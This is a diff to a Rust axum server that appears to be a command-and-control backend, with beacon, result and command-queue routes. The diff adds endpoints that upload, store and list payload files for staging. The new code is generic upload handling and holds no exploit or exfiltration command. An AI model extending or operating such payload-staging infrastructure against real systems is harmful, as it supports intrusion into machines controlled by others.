@@ -1,7 +1,7 @@
 use axum::{
     routing::{get, post},
     Router,
-    extract::{Path, State},
+    extract::{Path, State, Multipart},
     Json,
     http::{HeaderMap, StatusCode},
 };
@@ -169,6 +169,8 @@ async fn main() {
         .route("/api/beacon", post(receive_beacon))
         .route("/api/result", post(receive_result))
         .route("/api/command/queue", post(queue_command))
+        .route("/api/payloads/upload", post(upload_payload))
+        .route("/api/payloads/sessions", get(get_payload_sessions))
         .route("/api/dashboard/ws", get(dashboard_ws_handler))
         .fallback_service(ServeDir::new(dash))
         .layer(CorsLayer::permissive())
@@ -525,6 +527,122 @@ async fn get_command_results(Path(id): Path<String>, State(state): State<ServerS
 async fn get_logs(State(state): State<ServerState>) -> Json<Value> {
     match state.db.get_logs(100) {
         Ok(logs) => Json(serde_json::to_value(logs).unwrap_or(Value::Null)),
+        Err(_) => Json(Value::Null),
+    }
+}
+
+fn payloads_dir() -> &'static str {
+    "./payloads"
+}
+
+async fn upload_payload(
+    State(state): State<ServerState>,
+    mut multipart: Multipart,
+) -> Result<Json<Value>, StatusCode> {
+    let dir = payloads_dir();
+    tokio::fs::create_dir_all(dir)
+        .await
+        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+
+    let mut file_name = String::new();
+    let mut file_bytes: Vec<u8> = Vec::new();
+
+    while let Some(field) = multipart
+        .next_field()
+        .await
+        .map_err(|_| StatusCode::BAD_REQUEST)?
+    {
+        if field.name() == Some("file") {
+            file_name = field
+                .file_name()
+                .map(|s| s.to_string())
+                .unwrap_or_else(|| "payload.bin".to_string());
+            file_bytes = field
+                .bytes()
+                .await
+                .map_err(|_| StatusCode::BAD_REQUEST)?
+                .to_vec();
+        }
+    }
+
+    if file_bytes.is_empty() {
+        return Err(StatusCode::BAD_REQUEST);
+    }
+
+    let upload_id = uuid::Uuid::new_v4().to_string();
+    let safe_name = file_name
+        .chars()
+        .map(|c| if c.is_alphanumeric() || c == '.' || c == '-' || c == '_' { c } else { '_' })
+        .collect::<String>();
+    let storage_name = format!("{}_{}", upload_id, safe_name);
+    let storage_path = format!("{}/{}", dir, storage_name);
+
+    tokio::fs::write(&storage_path, &file_bytes)
+        .await
+        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+
+    let now = Utc::now().to_rfc3339();
+    let upload = PayloadUpload {
+        id: upload_id.clone(),
+        file_name: file_name.clone(),
+        file_size: file_bytes.len() as i64,
+        status: "Active".to_string(),
+        uploaded_at: now.clone(),
+    };
+
+    state
+        .db
+        .insert_payload_upload(&upload, &storage_path)
+        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+
+    log_info(
+        &state.db,
+        &state.tx,
+        "PayloadUpload",
+        None,
+        &format!("Stored payload {} ({} bytes)", file_name, file_bytes.len()),
+    );
+
+    let _ = state.tx.send(serde_json::json!({
+        "type": "PayloadUpload",
+        "payload": {
+            "id": upload_id,
+            "file_name": file_name,
+            "file_size": file_bytes.len(),
+            "status": "Active",
+            "uploaded_at": now
+        }
+    }));
+
+    Ok(Json(serde_json::json!({
+        "success": true,
+        "session": {
+            "id": upload_id,
+            "fileName": file_name,
+            "fileSize": file_bytes.len(),
+            "status": "Active",
+            "uploadedAt": now
+        }
+    })))
+}
+
+async fn get_payload_sessions(State(state): State<ServerState>) -> Json<Value> {
+    match state.db.get_payload_uploads(100) {
+        Ok(uploads) => {
+            let sessions: Vec<Value> = uploads
+                .into_iter()
+                .map(|u| {
+                    serde_json::json!({
+                        "id": u.id,
+                        "fileName": u.file_name,
+                        "fileSize": u.file_size,
+                        "status": u.status,
+                        "uploadedAt": u.uploaded_at,
+                    })
+                })
+                .collect();
+            Json(serde_json::json!(sessions))
+        }
         Err(_) => Json(Value::Null),
     }
 }
